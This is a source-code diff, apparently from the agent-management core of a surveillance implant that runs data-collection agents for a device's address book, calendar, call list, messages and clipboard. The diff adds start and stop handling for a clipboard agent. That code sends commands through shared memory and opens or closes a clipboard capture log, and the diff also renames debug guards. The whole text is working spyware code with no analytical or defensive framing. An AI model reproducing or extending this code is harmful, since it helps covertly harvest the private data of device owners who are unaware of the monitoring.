@@ -662,7 +662,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       }
     case AGENT_ORGANIZER:
       {   
-#ifdef DEBUG_TMP
+#ifdef DEBUG
         NSLog(@"Starting Agent AddressBook and Calendar");
 #endif
         RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
@@ -674,7 +674,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             [agentConfiguration objectForKey: @"status"] != AGENT_START)
           {
             [agentConfiguration setObject: AGENT_START forKey: @"status"];
-#ifdef DEBUG_TMP
+#ifdef DEBUG
             NSLog(@"Starting Agent AddressBook and Calendar: starting new thread");
 #endif 
             agentAddress.mAgentConfiguration  = agentConfiguration;
@@ -810,6 +810,54 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             NSLog(@"Agent Messages is already running");
 #endif
           }
+        break;
+      }
+    case AGENT_CLIPBOARD:
+      {
+#ifdef DEBUG
+        NSLog(@"%s: Starting Agent clipboard", __FUNCTION__);
+#endif
+        
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING
+            && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+        {
+          agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+          
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          shMemoryHeader->agentID         = agentID;
+          shMemoryHeader->direction       = D_TO_AGENT;
+          shMemoryHeader->command         = AG_START;
+          shMemoryHeader->commandDataSize = 0;
+          
+          BOOL success = [_logManager createLog: LOG_CLIPBOARD
+                                    agentHeader: nil
+                                      withLogID: 0];
+          
+          if (success == TRUE)
+          {
+            if ([mSharedMemory writeMemory: agentCommand
+                                    offset: OFFT_CLIPBOARD
+                             fromComponent: COMP_CORE])
+            {
+#ifdef DEBUG
+              NSLog(@"%s: Command START sent to Agent clipboard", __FUNCTION__);
+#endif
+              [agentConfiguration setObject: AGENT_RUNNING
+                                     forKey: @"status"];
+            }
+          }
+          
+          [agentConfiguration release];
+          [agentCommand release];
+        }
+        else
+        {
+#ifdef DEBUG
+          NSLog(@"%s: Agent clipboard is already running", __FUNCTION__);
+#endif
+        }
         break;
       }
     default:
@@ -1091,6 +1139,37 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           }
         break;
       }
+    case AGENT_CLIPBOARD:
+      {
+#ifdef DEBUG        
+        NSLog(@"Stopping Agent clipboard");
+#endif
+        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+        
+        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+        shMemoryHeader->agentID         = agentID;
+        shMemoryHeader->direction       = D_TO_AGENT;
+        shMemoryHeader->command         = AG_STOP;
+        
+        if ([mSharedMemory writeMemory: agentCommand
+                                offset: OFFT_CLIPBOARD
+                         fromComponent: COMP_CORE] == TRUE)
+        {
+#ifdef DEBUG
+          NSLog(@"Stop command sent to Agent clipboard");
+#endif
+          
+          agentConfiguration = [self getConfigForAgent: agentID];
+          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+          
+          [_logManager closeActiveLog: LOG_CLIPBOARD 
+                            withLogID: 0];
+        }
+        
+        [agentCommand release];
+        
+        break;
+      }
     default:
       {
         break;
@@ -1107,7 +1186,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
   
   NSMutableData       *agentCommand;
  
-#ifdef DEBUG_TMP
+#ifdef DEBUG
   NSLog(@"Start all Agents called");
 #endif
  
@@ -1314,7 +1393,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
               {
                 RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
                 RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
-#ifdef DEBUG_TMP
+#ifdef DEBUG
                 NSLog(@"Starting Agent AddressBook %x and Calendar %x", agentAddress, agentCalendar);
 #endif                
                 [anObject setObject: AGENT_START forKey: @"status"];  
@@ -1329,7 +1408,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 [NSThread detachNewThreadSelector: @selector(start)
                                          toTarget: agentCalendar
                                        withObject: nil];
-#ifdef DEBUG_TMP
+#ifdef DEBUG
                 NSLog(@"Agent AddressBook and Calendar Started");
 #endif
                   
@@ -1437,6 +1516,46 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 [NSThread detachNewThreadSelector: @selector(start)
                                          toTarget: agentCallList
                                        withObject: nil];
+                break;
+              }
+            case AGENT_CLIPBOARD:
+              {
+#ifdef DEBUG
+                NSLog(@"%s: Starting Agent clipboard", __FUNCTION__);
+#endif
+                agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+                
+                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                shMemoryHeader->agentID         = agentID;
+                shMemoryHeader->direction       = D_TO_AGENT;
+                shMemoryHeader->command         = AG_START;
+                shMemoryHeader->commandDataSize = 0;
+                
+                BOOL success = [_logManager createLog: LOG_CLIPBOARD
+                                          agentHeader: nil
+                                            withLogID: 0];
+                
+                if (success == TRUE)
+                {
+                  if ([mSharedMemory writeMemory: agentCommand
+                                          offset: OFFT_CLIPBOARD
+                                   fromComponent: COMP_CORE])
+                  {
+#ifdef DEBUG
+                    NSLog(@"%s: Command START sent to Agent clipboard", __FUNCTION__);
+#endif
+                    [anObject setObject: AGENT_RUNNING
+                                 forKey: @"status"];
+                  }
+                }
+                else
+                {
+#ifdef DEBUG
+                  NSLog(@"An error occurred while creating log for Agent clipboard");
+#endif
+                }
+                
+                [agentCommand release];
                 break;
               }
             default:
@@ -1708,6 +1827,37 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                  forKey: @"status"];
                   }
 
+                break;
+              }
+            case AGENT_CLIPBOARD:
+              {
+#ifdef DEBUG        
+                NSLog(@"Stopping Agent clipboard");
+#endif
+                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+                
+                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                shMemoryHeader->agentID         = agentID;
+                shMemoryHeader->direction       = D_TO_AGENT;
+                shMemoryHeader->command         = AG_STOP;
+                
+                if ([mSharedMemory writeMemory: agentCommand
+                                        offset: OFFT_CLIPBOARD
+                                 fromComponent: COMP_CORE] == TRUE)
+                {
+#ifdef DEBUG
+                  NSLog(@"Stop command sent to Agent clipboard");
+#endif
+                  
+                  [_logManager closeActiveLog: LOG_CLIPBOARD 
+                                    withLogID: 0];
+                  
+                  [anObject setObject: AGENT_STOP
+                               forKey: @"status"];
+                }
+                
+                [agentCommand release];
+                
                 break;
               }
             default:
